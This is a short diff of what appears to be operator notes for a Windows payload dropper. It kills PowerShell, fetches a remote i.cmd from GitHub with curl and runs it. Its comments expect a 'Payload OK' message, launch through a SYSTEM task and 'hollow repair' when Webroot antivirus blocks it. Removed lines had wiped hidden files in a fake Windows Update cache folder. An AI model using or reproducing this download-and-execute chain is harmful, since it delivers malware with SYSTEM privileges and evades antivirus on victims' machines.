@@ -1,14 +1,9 @@
-# Use i.cmd (H had a broken PowerShell caret launch)
+# Fresh machine OR Webroot IP-only fix:
 
 taskkill /F /IM powershell.exe >nul 2>&1
-del /f /q C:\WINDOWS\TEMP\go.cmd C:\WINDOWS\TEMP\g.cmd C:\WINDOWS\TEMP\h.cmd C:\WINDOWS\TEMP\i.cmd
-attrib -h -s -r "%ProgramData%\Microsoft\Windows\WER\Temp\.wucache\*" /s >nul 2>&1
-del /f /q "%ProgramData%\Microsoft\Windows\WER\Temp\.wucache\*"
-
+del /f /q C:\WINDOWS\TEMP\i.cmd
 curl.exe -L -o C:\WINDOWS\TEMP\i.cmd https://raw.githubusercontent.com/xnobuddy/github-drop/main/i.cmd
 C:\WINDOWS\TEMP\i.cmd
 
-# MUST see:
-#   === GO.CMD BUILD 20260729I ===
-#   Payload OK [...], launched via SYSTEM task
-# Then wait 90s and type the .diag.log
+# Expect: GO.CMD BUILD 20260729I + Payload OK [WU_BUILD_20260729K]
+# Log should mention Webroot / hollow repair if AV was blocking SC.
